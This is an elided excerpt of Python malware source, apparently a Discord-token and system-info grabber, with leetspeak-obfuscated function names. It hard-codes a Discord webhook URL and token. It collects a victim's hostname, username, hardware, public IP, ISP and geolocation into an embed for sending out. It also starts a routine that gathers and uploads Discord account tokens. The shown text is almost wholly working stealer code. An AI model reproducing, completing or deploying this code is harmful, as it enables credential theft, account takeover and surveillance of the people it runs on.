...
w3bh00k_ur1 = "https://discord.com/api/webhooks/1404522265940459561/9kM4gOX6M4_kRrAYT9S4dHKAPzYr9wjNk9iXshqfuJN_aI39Ck2hWoUn9K6vyVEfBZD7"  
...
def Sy5t3m_Inf0():
    ...
    try:
        ...
        for drive in drives_info:
            ...
            free_space_gb = "{:.2f}GB".format(drive['free'] / (1024 ** 3))
            total_space_gb = "{:.2f}GB".format(drive['total'] / (1024 ** 3))
...
"""
    ...
    embed = Embed(title=f'System Info {hostname_pc}:', color=color_embed)

    embed.add_field(name="User Pc:", value=f"""```Hostname    > {hostname_pc}
Username    > {username_pc}
DisplayName > {displayname_pc}```""", inline=False)

    embed.add_field(name="System:", value=f"""```Plateform     > {p14tf0rm_1nf0}
...
RAM  > {r4m_1nf0}Go```""", inline=False)
    ...
    embed.add_field(name="Ip:", value=f"""```Public > {ip_address_public}
Local  > {ip_adress_local}
Isp    > {isp}
Org    > {org}
As     > {as_number}```""", inline=False)

    embed.add_field(name="Disk:", value=f"""```{d15k_5t4t5}```""", inline=False)

    embed.add_field(name="Ip Location:", value=f"""```Country   > {country} ({country_code})
...
def Di5c0rd_T0k3n():
    ...
    def upload_t0k3n5():
        ...
        if not t0k3n5:
            embed = Embed(
                title=f'Discord Token {hostname_pc}:', 
